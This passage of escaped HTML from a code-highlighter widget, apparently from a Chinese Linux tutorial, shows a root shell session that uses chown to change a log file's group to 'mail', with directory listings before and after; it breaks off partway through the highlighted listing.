		&lt;div id=&quot;crayon-587abc0e58baa592005261&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
[root@localhost test6]# ll
总计 604
---xr--r-- 1 root users 302108 11-30 08:39 linklog.log
---xr--r-- 1 root root  302108 11-30 08:39 log2012.log
-rw-r--r-- 1 root users     61 11-30 08:39 log2013.log
-rw-r--r-- 1 root users      0 11-30 08:39 log2014.log
-rw-r--r-- 1 root users      0 11-30 08:39 log2015.log
-rw-r--r-- 1 root users      0 11-30 08:39 log2016.log
-rw-r--r-- 1 root users      0 11-30 08:39 log2017.log
[root@localhost test6]# chown :mail log2012.log 
[root@localhost test6]# ll
总计 604
---xr--r-- 1 root users 302108 11-30 08:39 linklog.log
---xr--r-- 1 root mail  302108 11-30 08:39 log2012.log
-rw-r--r-- 1 root users     61 11-30 08:39 log2013.log
-rw-r--r-- 1 root users      0 11-30 08:39 log2014.log
-rw-r--r-- 1 root users      0 11-30 08:39 log2015.log
-rw-r--r-- 1 root users      0 11-30 08:39 log2016.log
-rw-r--r-- 1 root users      0 11-30 08:39 log2017.log&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58baa592005261-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587abc0e58baa592005261-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58baa592005261-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587abc0e58baa592005261-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58baa592005261-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587abc0e58baa592005261-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58baa592005261-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587abc0e58baa592005261-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58baa592005261-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587abc0e58baa592005261-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58baa592005261-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587abc0e58baa592005261-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58baa592005261-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587abc0e58baa592005261-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58baa592005261-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587abc0e58baa592005261-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58baa592005261-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587abc0e58baa592005261-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58baa592005261-19&quot;&gt;19&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58baa592005261-1&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;localhost &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# ll&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587abc0e58baa592005261-2&quot;&gt;总计&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;604&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58baa592005261-3&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;302108&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;linklog&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587abc0e58baa592005261-4&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;302108&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2012&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58baa592005261-5&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;61&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587abc0e58baa592005261-6&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2014&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58baa592005261-7&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2015&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587abc0e58baa592005261-8&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2016&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58baa592005261-9&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2017&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587abc0e58baa592005261-10&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;localhost &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# chown :mail log2012.log &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58baa592005261-11&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;localhost &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# ll&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587abc0e58baa592005261-12&quot;&gt;总计&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;604&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58baa592005261-13&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;302108&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;linklog&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587abc0e58baa592005261-14&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;302108&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2012&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58baa592005261-15&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;61&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587abc0e58baa592005261-16&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2014&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58baa592005261-17&quot;&gt;
